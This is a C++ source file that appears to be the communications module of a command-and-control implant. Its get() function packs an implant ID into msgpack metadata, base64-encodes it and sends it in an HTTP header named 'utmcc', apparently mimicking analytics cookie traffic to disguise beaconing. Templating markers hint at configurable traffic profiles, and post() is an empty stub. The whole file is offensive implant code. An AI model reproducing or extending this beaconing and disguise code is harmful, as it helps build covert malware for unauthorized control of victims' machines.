#include <vector>
#include <iostream>
#include "../protocols/http_wininet/http.h"
#include "../data/transforms/transforms.h"
#include "../data/msgpack/msgpack.h"

//Comms file, this is where the comms/transform calls, etc go
// 
int get(std::string implant_uuid) {
    //note, pass a copy of implant_uuid in, as we are going to be potentialyl heavily editing it. 

    std::vector<uint8_t> http_response_buffer;

    //[TEMPLATE ME] //temp use of headers, matching test mc2 profile. 
    // Define headers (No \r\n needed)

    //create metadata
    std::map<std::string, std::string> metadata;
    metadata["implant_uuid"] = implant_uuid;

    std::vector<uint8_t> metadata_as_msgpack;
    create_metadata(metadata, metadata_as_msgpack);

    //hold bytes in string, as all the transforsm want a string
    std::string payload(metadata_as_msgpack.begin(), metadata_as_msgpack.end());

    /*
    TEMPLATE_BEGIN
    */

    //bsae64 encode the implant_uuid
    base64_encode_inplace(payload); //this should be metadata buffer

    //add into header
    std::vector<std::wstring> headers = {
    L"utmcc: " + std::wstring(payload.begin(), payload.end())
    };

    if (HTTP_GET(headers, http_response_buffer)) {
        std::cout << "Success! Bytes read: " << http_response_buffer.size() << std::endl;
    }
    else {
        std::cerr << "Request failed." << std::endl;
    }

    /*
    TEMPLATE_END
    */

    return 0;
}



int post() {
    return 1;
}